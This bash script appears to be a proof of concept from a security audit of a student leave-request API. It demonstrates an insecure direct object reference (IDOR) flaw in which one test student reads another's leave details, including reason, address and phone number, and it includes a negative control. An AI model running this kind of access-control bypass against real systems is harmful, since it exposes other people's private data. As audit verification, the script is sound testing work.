#!/usr/bin/env bash
# S7 - IDOR baca detail cuti milik mahasiswa lain (GET /api/cuti/me/:id)
# Sink: src/models/cutiModel.js findOwned() -> WHERE c.id = $2 (tidak memeriksa mahasiswa_id)
# Prasyarat: andi (penyerang) tahu atau menebak UUID pengajuan cuti milik budi (korban).
# Budi harus punya pengajuan cuti aktif. Kalau belum ada, buat dulu lewat API sebagai budi.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"; BUH="Authorization: Bearer $BUDI_TOKEN"
set -a; source "$REPO_ROOT/.env"; set +a

echo "== Cari pengajuan cuti milik budi lewat akunnya sendiri =="
BUDI_CUTI=$(curl -s -m 10 "$B/api/cuti/me" -H "$BUH" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{const j=JSON.parse(d);const row=j.data.find(x=>x.status==='diajukan')||j.data[0];if(!row)process.exit(1);process.stdout.write(row.id)})") || true

if [ -z "${BUDI_CUTI:-}" ]; then
  echo "Budi belum punya pengajuan cuti, membuat satu..."
  BUDI_CUTI=$(curl -s -m 10 -X POST "$B/api/cuti/me" -H "$BUH" -H 'Content-Type: application/json' \
    -d "{\"semester\":\"$SEMESTER_AKTIF\",\"kategori\":\"kesehatan\",\"alasan\":\"PoC S7\",\"alamat_cuti\":\"Jl Rahasia Budi\",\"nomor_telepon\":\"081200000099\"}" \
    | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(d).data.id))")
fi
echo "ID cuti budi: $BUDI_CUTI"

echo "== Kontrol negatif: andi akses ID acak (harus 404) =="
curl -s -m 10 "$B/api/cuti/me/00000000-0000-0000-0000-000000000000" -H "$ANH" -w " | HTTP %{http_code}\n"

echo "== S7: andi baca detail cuti MILIK BUDI =="
RESP=$(curl -s -m 10 "$B/api/cuti/me/$BUDI_CUTI" -H "$ANH" -w "\nHTTP %{http_code}")
echo "$RESP"
CODE=$(echo "$RESP" | tail -1 | grep -oE '[0-9]{3}')

echo
if [ "$CODE" = "200" ]; then
  echo "KESIMPULAN: TERBUKTI. Andi (bukan pemilik) berhasil membaca alasan, alamat, dan nomor telepon pengajuan cuti milik Budi."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini (HTTP $CODE)."
fi
